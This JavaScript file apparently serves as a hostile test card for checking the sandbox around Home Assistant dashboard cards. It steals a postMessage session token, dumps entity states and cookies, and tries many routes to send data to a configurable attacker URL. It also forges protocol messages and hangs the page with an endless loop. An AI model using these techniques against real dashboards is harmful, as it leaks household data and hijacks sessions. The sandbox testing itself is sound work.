(function () {
  window.__attempts = [];
  var captured = { token: "", port: null };
  var origPost = MessagePort.prototype.postMessage;
  MessagePort.prototype.postMessage = function (message) {
    if (message && typeof message === "object" && typeof message.token === "string" && message.token !== "") {
      captured.token = message.token;
      captured.port = this;
    }
    return origPost.apply(this, arguments);
  };

  function record(name, outcome, detail) {
    var entry = { name: name, outcome: outcome, detail: String(detail === undefined ? "" : detail).slice(0, 300) };
    window.__attempts.push(entry);
    console.log("ATTEMPT " + JSON.stringify(entry));
    try {
      window.parent.postMessage({ type: "attempt", entry: entry }, "*");
    } catch (e) {
      console.log("ATTEMPT_POST_FAILED " + e.message);
    }
  }

  function within(promise, ms) {
    return Promise.race([
      promise,
      new Promise(function (resolve) {
        setTimeout(function () {
          resolve({ ok: false, detail: "no event within " + ms + "ms" });
        }, ms);
      }),
    ]);
  }

  function sync(name, fn) {
    try {
      var result = fn();
      record(name, result.ok ? "succeeded" : "blocked", result.detail);
    } catch (e) {
      record(name, "blocked", e.name + ": " + e.message);
    }
  }

  function async_(name, fn) {
    var p;
    try {
      p = fn();
    } catch (e) {
      record(name, "blocked", e.name + ": " + e.message);
      return Promise.resolve();
    }
    return within(p, 1500).then(
      function (result) {
        record(name, result.ok ? "succeeded" : "blocked", result.detail);
      },
      function (e) {
        record(name, "blocked", (e && e.name) + ": " + (e && e.message));
      },
    );
  }

  document.addEventListener("securitypolicyviolation", function (event) {
    console.log("CSPVIOLATION " + event.violatedDirective + " " + event.blockedURI);
  });

  function loadEvent(element, parent) {
    return new Promise(function (resolve) {
      element.onload = function () {
        resolve({ ok: true, detail: "load event" });
      };
      element.onerror = function () {
        resolve({ ok: false, detail: "error event" });
      };
      parent.appendChild(element);
    });
  }

  function exfilAttempts(attacker) {
    var host = attacker.replace(/^https?:\/\//, "");
    var tasks = [];
    sync("localStorage", function () {
      return { ok: true, detail: String(window.localStorage.length) };
    });
    sync("sessionStorage", function () {
      return { ok: true, detail: String(window.sessionStorage.length) };
    });
    sync("cookies", function () {
      return { ok: true, detail: JSON.stringify(document.cookie) };
    });
    sync("parent.document", function () {
      return { ok: true, detail: String(window.parent.document.title) };
    });
    sync("top.document", function () {
      return { ok: true, detail: String(window.top.document.title) };
    });
    tasks.push(
      async_("fetch", function () {
        return fetch(attacker + "/fetch?d=1", { mode: "no-cors" }).then(function () {
          return { ok: true, detail: "resolved" };
        });
      }),
    );
    tasks.push(
      async_("websocket", function () {
        return new Promise(function (resolve) {
          var ws = new WebSocket("ws://" + host + "/ws?d=1");
          ws.onopen = function () {
            resolve({ ok: true, detail: "open" });
          };
          ws.onerror = function () {
            resolve({ ok: false, detail: "error event" });
          };
        });
      }),
    );
    tasks.push(
      async_("xhr", function () {
        return new Promise(function (resolve) {
          var xhr = new XMLHttpRequest();
          xhr.open("GET", attacker + "/xhr?d=1");
          xhr.onload = function () {
            resolve({ ok: true, detail: "status " + xhr.status });
          };
          xhr.onerror = function () {
            resolve({ ok: false, detail: "error event" });
          };
          xhr.send();
        });
      }),
    );
    sync("sendBeacon", function () {
      var queued = navigator.sendBeacon(attacker + "/beacon?d=1", "x");
      return { ok: queued, detail: "returned " + queued };
    });
    tasks.push(
      async_("img", function () {
        var img = document.createElement("img");
        img.src = attacker + "/img?d=1";
        return loadEvent(img, document.body);
      }),
    );
    tasks.push(
      async_("link_prefetch", function () {
        var link = document.createElement("link");
        link.rel = "prefetch";
        link.href = attacker + "/prefetch?d=1";
        return loadEvent(link, document.head);
      }),
    );
    tasks.push(
      async_("link_preload_style", function () {
        var link = document.createElement("link");
        link.rel = "stylesheet";
        link.href = attacker + "/css?d=1";
        return loadEvent(link, document.head);
      }),
    );
    sync("link_dns_prefetch", function () {
      var link = document.createElement("link");
      link.rel = "dns-prefetch";
      link.href = "//" + host;
      document.head.appendChild(link);
      return { ok: true, detail: "element appended, no feedback channel" };
    });
    sync("window.open", function () {
      var w = window.open(attacker + "/open?d=1", "_blank");
      return { ok: w !== null, detail: w === null ? "null" : "window object" };
    });
    sync("top.location", function () {
      window.top.location = attacker + "/top?d=1";
      return { ok: true, detail: "assigned" };
    });
    sync("form_submit", function () {
      var form = document.createElement("form");
      form.action = attacker + "/form";
      form.method = "GET";
      var input = document.createElement("input");
      input.name = "d";
      input.value = "1";
      form.appendChild(input);
      document.body.appendChild(form);
      form.submit();
      return { ok: true, detail: "submit() returned" };
    });
    sync("eval", function () {
      return { ok: true, detail: String(eval("1+1")) };
    });
    sync("new_Function", function () {
      return { ok: true, detail: String(new Function("return 2")()) };
    });
    tasks.push(
      async_("worker_blob", function () {
        var url = URL.createObjectURL(new Blob(["postMessage(1)"], { type: "text/javascript" }));
        return new Promise(function (resolve) {
          var w = new Worker(url);
          w.onmessage = function () {
            resolve({ ok: true, detail: "worker ran" });
          };
          w.onerror = function (e) {
            resolve({ ok: false, detail: "worker error " + (e && e.message) });
          };
        });
      }),
    );
    tasks.push(
      async_("import_attacker", function () {
        return import(attacker + "/import.js?d=1").then(function () {
          return { ok: true, detail: "module loaded" };
        });
      }),
    );
    tasks.push(
      async_("script_tag_attacker", function () {
        var s = document.createElement("script");
        s.src = attacker + "/script.js?d=1";
        return loadEvent(s, document.head);
      }),
    );
    tasks.push(
      async_("iframe_attacker", function () {
        var f = document.createElement("iframe");
        f.src = attacker + "/frame?d=1";
        return loadEvent(f, document.body);
      }),
    );
    return Promise.all(tasks);
  }

  function dumpInit() {
    var hass = window.hass;
    record("read_init_hass", "succeeded", JSON.stringify(hass.states));
    record("init_hass_keys", "succeeded", Object.keys(hass.states).join(","));
    record("hass_callWS", "info", typeof hass.callWS);
    return hass.callWS({ type: "get_states" }).then(
      function () {
        record("callWS_effect", "succeeded", "resolved");
      },
      function (e) {
        record("callWS_effect", "blocked", e.message);
      },
    );
  }

  function forgeWindow() {
    var token = captured.token;
    record("token_visible", token === "" ? "blocked" : "succeeded", token === "" ? "no token seen" : "len " + token.length);
    window.parent.postMessage({ type: "heartbeat", token: token }, "*");
    window.parent.postMessage({ type: "request", token: token, id: 1, method: "callService" }, "*");
    window.parent.postMessage({ type: "rendered", token: token }, "*");
    window.parent.postMessage({ type: "error", token: token, code: "mod_error", message: "forged" }, "*");
    record("forge_window_non_ready", "sent", "heartbeat, request, rendered, error via window.parent.postMessage");
  }

  function forgeReady() {
    window.parent.postMessage({ type: "ready", token: "" }, "*");
    record("forge_ready", "sent", "second ready via window.parent.postMessage");
  }

  function forgePort() {
    if (captured.port === null) {
      record("forge_port", "blocked", "no port captured");
      return;
    }
    var token = captured.token;
    origPost.call(captured.port, { type: "request", token: token, id: 99, method: "forged" });
    origPost.call(captured.port, { type: "heartbeat", token: token });
    record("forge_port", "sent", "request and heartbeat through captured port with token");
  }

  function navigateSelf(attacker, path) {
    var data = encodeURIComponent(JSON.stringify(window.hass.states));
    record("navigate_self", "sent", path + " d.length=" + data.length);
    window.location.href = attacker + path + "?d=" + data;
  }

  class HostileCard extends HTMLElement {
    setConfig(config) {
      this.cfg = config;
      var mode = String(config.mode || "attempts");
      var attacker = String(config.attacker || "");
      var self = this;
      this.textContent = "hostile card " + mode;
      setTimeout(function () {
        run(mode, attacker, config);
      }, 50);
    }
    set hass(value) {
      this._hass = value;
      window.__lastHassCount = (window.__lastHassCount || 0) + 1;
    }
  }

  function run(mode, attacker) {
    record("mode", "info", mode);
    if (mode === "attempts") {
      dumpInit().then(function () {
        return exfilAttempts(attacker);
      }).then(function () {
        record("done", "info", "token=" + captured.token);
      });
      return;
    }
    if (mode === "forge") {
      setTimeout(function () {
        forgeWindow();
        forgePort();
      }, 1500);
      return;
    }
    if (mode === "forge_ready") {
      setTimeout(forgeReady, 1500);
      return;
    }
    if (mode === "navigate") {
      setTimeout(function () {
        navigateSelf(attacker, "/nav");
      }, 1500);
      return;
    }
    if (mode === "navhang") {
      setTimeout(function () {
        navigateSelf(attacker, "/hang");
      }, 1500);
      return;
    }
    if (mode === "busy") {
      setTimeout(function () {
        record("busy_loop", "sent", "entering while(true)");
        while (true) {}
      }, 1500);
      return;
    }
  }

  customElements.define("hostile-card", HostileCard);
})();
